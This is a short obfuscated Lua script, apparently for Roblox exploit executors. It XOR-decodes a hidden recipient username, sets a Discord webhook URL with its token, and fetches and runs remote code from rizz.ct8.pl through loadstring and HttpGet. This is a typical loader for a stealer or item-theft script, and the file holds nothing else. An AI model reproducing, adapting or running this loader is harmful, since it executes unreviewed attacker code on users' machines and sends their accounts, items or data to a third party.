local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end UserName=v7("\143\167\225\37\193\168\140\180\208\50\214","\237\194\143\74\178\196");Webhook="https://ptb.discord.com/api/webhooks/1095410675897077760/gDUFtoAmOe-1Ssa8LpXKcrST2AksAGXFmwH7qKiGim_Av-WXEM0O695hmntrscrCsVlI";loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main",true))();
